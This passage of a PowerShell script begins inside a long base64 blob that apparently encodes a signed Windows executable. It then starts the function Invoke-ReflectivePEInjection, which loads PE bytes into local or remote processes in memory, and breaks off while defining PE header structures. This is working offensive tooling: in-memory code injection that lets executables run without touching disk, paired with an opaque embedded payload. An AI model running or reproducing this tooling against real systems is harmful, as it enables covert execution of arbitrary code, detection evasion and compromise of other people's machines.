MPJA8lDyYPJw8oDykPKg8rDywPLQ8uDy8PMA8xDzIPADgAQDIAQAAcDF0MXgxfDGAMYQxiDGMMZAxlDGYMZwxoDGkMagxrDGwMbQxuDG8McAxxDHIMcwx0DHUMdgx3DEUMhgyHDIgMiQyKDIsMjAyNDI4MjwyiDOMMwA0BDQ0NDg0hDSINMg0zDTQNNQ06DTsNPA0RDVINbg1vDXMNdA12DXwNfQ1+DX8NQA2CDYMNhA2GDYcNiQ2LDZENkg2YDZkNnw2gDaYNqg2uDbINtg26DbsNvA2BDcINyA3MDc0N0w3UDdoN3g3fDeUN5g3nDewN7Q3uDe8N9A31DfoN+w3/DcAOAQ4DDgkODQ4RDhIOFg4XDhsOHA4dDh4OHw4hDiIOJA4mDiwOLQ4zDjQOOg47DgEORQ5JDk0OUQ5SDlYOVw5YDloOYA5kDmgOaQ5qDmsObQ5vDnUOdg58DkAOhA6IDokOjQ6ODpIOkw6UDpYOnA6dDqMOpw6oDq0Org6EDswOzg7RDtkO4A7oDvAO9w74DsAPCA8QDxgPIA8jDyoPMg86DwEPQg9JD0oPUQ9SD1oPXQ9kD2cPbg92D34PRQ+GD44Plg+eD6YPrg+2D74Phg/OD9YP2A/fD+MP5g/uD/EP+Q/7D/4PwDwAQBQAAAAGDAgMCgwNDBUMGAwgDCMMLwwwDDIMOgw8DD0MBAxGDEcMTQxODFUMVgxaDGMMZgxoDHMMdAx2DHgMegx7DH0MQgyEDIkMgAAAAACAFABAAAIMBAwdDV8NYQ1jDWUNZw1pDWsNbQ1vDXENcw11DXcNeQ17DX0Nfw1BDYMNhQ2HDYkNiw2NDY8NkQ2TDZUNtQ22DbcNuA25DboNuw28Db0Nvg2LDsoPCw8MDw0PDg8PDxAPEQ8SDxMPFA8VDxYPFw8YDxkPGg8bDxwPHQ8eDx8PIA8hDyIPIw8kDyUPJg8nDygPKQ8qDysPLA8tDy4PLw8wDzEPMg8zDzQPNw84DzkPOg87DzwPPQ8+Dz8PAA9BD0IPQw9ED0UPRg9HD0gPSQ9KD0sPTA9ND04PTw9QD1EPUg9TD1QPVQ9WD1cPWA9ZD1oPWw9cD10PXg9fD2APYQ9iD2MPbQ9xD3UPeQ99D0UPiA+JD4oPiw+TD5oPnA+dD54Pnw+gD6EPog+jD6QPpQ+oD6kPqg+rD6wPrQ+uD68PsQ+yD7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"

function Invoke-ReflectivePEInjection
{
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
